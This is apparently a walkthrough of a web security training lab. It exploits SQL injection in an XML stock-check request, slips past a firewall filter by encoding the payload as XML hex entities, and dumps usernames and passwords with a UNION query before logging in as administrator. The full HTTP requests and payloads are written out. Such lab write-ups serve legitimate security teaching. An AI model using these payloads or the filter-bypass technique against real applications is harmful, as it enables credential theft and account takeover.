## SQL injection with filter bypass via XML encoding

This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

Hint :

A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the Hackvertor extension to do this.

## Notes

- /login
- /product/stock
- `/resources/js/xmlStockCheckPayload.js`
- `/resources/js/stockCheck.js`


## Resume

1. Capture the stock check request
2. Confirm SQL injection in the XML parameter
3. Determine the number of returned columns
4. Bypass the WAF using XML entity encoding
5. Dump usernames and passwords
6. Log in as `administrator`

## Solve

Intercept the stock check request:

```http
POST /product/stock HTTP/2
Host: 0a5d003b0453e9f9806162f8008900d2.web-security-academy.net
Content-Type: application/xml
Cookie: session=wOu4eAJR2xRabm1yYMjsMmvDhzMAHlmL

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

Modify the `storeId` value with a mathematical expression:

```xml
<storeId>1+1</storeId>
```

The application returns stock information for another store, confirming that the input is evaluated by the SQL query.

Try a UNION payload:

```xml
<storeId>1 UNION SELECT NULL</storeId>
```

The request is blocked by the WAF.

Because the payload is injected inside XML, encode the payload using XML entities.

Using Hackvertor:

- Highlight payload
- Right click
- `Extensions -> Hackvertor -> Encode -> hex_entities`

Encoded payload:

```xml
<storeId><@hex_entities>1 UNION SELECT NULL</@hex_entities></storeId>
```

The request now bypasses the WAF successfully.

The query only returns a single column, so concatenate username and password:

```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
```

Full request:

```http
POST /product/stock HTTP/2
Host: 0a5d003b0453e9f9806162f8008900d2.web-security-academy.net
Cookie: session=wOu4eAJR2xRabm1yYMjsMmvDhzMAHlmL
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
</stockCheck>
```

The response returns usernames and passwords separated by `~`.

Example:

```text
administrator~password123
wiener~peter
carlos~montoya
```


Credentials :

```text
administrator:password123
```

Log in with the administrator account to solve the lab.